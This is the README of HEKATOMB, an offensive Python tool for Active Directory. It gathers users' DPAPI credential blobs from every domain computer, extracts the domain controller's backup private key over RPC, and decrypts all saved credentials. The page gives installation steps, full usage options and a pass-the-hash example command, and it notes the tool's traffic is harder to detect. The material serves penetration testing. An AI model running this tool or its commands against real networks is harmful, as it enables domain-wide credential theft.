# The HEKATOMB project

<div align="center">
  <br>
  <img src="https://img.shields.io/badge/Python-3.11-informational">
  <br>
  <a href="https://twitter.com/intent/follow?screen_name=ProcessusT" title="Follow"><img src="https://img.shields.io/twitter/follow/ProcessusT?label=ProcessusT&style=social"></a>
  <br>
  <h1>
    Because Domain Admin rights are not enough.<br />
                Hack them all.<br />
                🐍
  </h1>
  <br><br>
</div>

> Hekatomb is a python script that connects to LDAP directory to retrieve all computers and users informations.<br />
> Then it will download all DPAPI blob of all users from all computers.<br />
>	Finally, it will extract domain controller private key through RPC uses it to decrypt all credentials.<br />
> <br />
> 
<br>
<div align="center">
<img src="https://github.com/ProcessusT/HEKATOMB/raw/main/.assets/hekatomb_v1.4.png" width="80%;">
</div>
<br>


## Changelog
<br />
On last version (V 1.5) :<br />
- Fix local packages importation error with pip installation<br />
- Prevent crash when no computers are reachable<br />
<br />
V 1.4 :<br />
- Fix LDAP search limitation to 1000 items<br />
- Add LDAP filter for computers to select only "Enabled" computers<br />
- Add function to scan SMB port with multi thread prior to get blob and master key files<br />
- Add a progress bar for files collection<br />
- Added 2 function modules to simplify code readability and maintainability<br />
<br />
V 1.3 :<br />
- Compare LDAP usernames with SMB users folders before trying to retrieve blob files to get them faster<br />
- DNSTCP option is no more used, DNS resolution is trying on UDP first and with TCP if it fails<br />
<br />
V 1.2.1 :<br />
- Use of the ldap3 library instead of Impacket for LDAP requests<br />
- Fix a bug that prevented querying trusted domains via an external domain account with administrator rights on the trusted domain controller<br />
- Add -smb2 parameter to force the use of SMBv2 protocol when it is available<br />
- LDAP and SMB communications are now more difficult to detect on the network<br />
<br />
V 1.2.1 :<br />
- Add installation with Pypi<br />
<br />
V 1.2 :<br />
- Increase the LDAP results limit of users or computers extraction (1000 previously)<br />
- Add the possibility to specify a user or a computer to target<br />
- Add the possibility to export results to a CSV file<br />
<br />
V 1.1 :<br />
- Domain controller private key extraction through RPC<br />
- Credentials classification by computers and by users<br />

<br /><br />

## What da fuck is this ?
<br />
On Windows, credentials saved in the Windows Credentials Manager are encrypted using Microsoft's Data Protection API and stored as "blob" files in user AppData folder.<br />
Outside of a domain, the user's password hash is used to encrypt these "blobs".<br />
When you are in an Active Directory environment, the Data Protection API uses the domain controller's public key to encrypt these blobs.<br />
With the extracted private key of the domain controller, it is possible to decrypt all the blobs, and therefore to recover all the secrets recorded in the Windows identification manager of all the workstations in the domain.<br />
<br />
Hekatomb automates the search for blobs and the decryption to recover all domain users' secrets ☠️
<br />
<br />

## Installation
<br>
From Pypi for Debian-based :
<br><br>

```python
pip3 install hekatomb
```


<br>
From BlackArch :
<br><br>

```python
pacman -S hekatomb
```

[![BlackArch package](https://repology.org/badge/version-for-repo/blackarch/hekatomb.svg)](https://repology.org/project/hekatomb/versions)

<br>

From github :
<br><br>

```python
git clone https://github.com/ProcessusT/HEKATOMB
cd HEKATOMB
poetry install
poetry run hekatomb
```
<br>
<br>


## Usage
<br>
Hekatomb uses Impacket syntax :
<br><br>

```python
usage: hekatomb [-h] [-hashes LMHASH:NTHASH] [-pvk PVK] [-dns DNS] [-dnstcp] [-port [port]] [-just-user JUST_USER] [-just-computer JUST_COMPUTER] [-md5] [-debug] [-debugmax] target

Script used to automate domain computers and users extraction from LDAP and extraction of domain controller private key through RPC to collect and decrypt all users' DPAPI secrets saved in Windows credential manager.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address of DC>

options:
  -h, --help            Show this help message and exit

authentication:
  -hashes LMHASH:NTHASH     NTLM hashes, format is LMHASH:NTHASH

authentication:
  -pvk PVK                  Domain backup keys file
  -dns DNS                  DNS server IP address to resolve computers hostname
  -port [port]              Port to connect to SMB Server
  -smb2                     Force the use of SMBv2 protocol
  -just-user [USERNAME]     Test only specified username
  -just-computer [COMPUTER] Test only specified computer
  -md5                      Print md5 hash insted of clear passwords

output:
  -csv                      Output the results in csv

verbosity:
  -debug                Turn DEBUG output ON
  -debugmax             Turn DEBUG output TO MAAAAXXXX
```

<br>
<br>

## Example

<br>

```python
hekatomb -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug 
```

<br>
<br>
    
## How to retrieve domain backup keys ?

<br />
If no domain backup keys are provided, the script will retrieve it through RPC
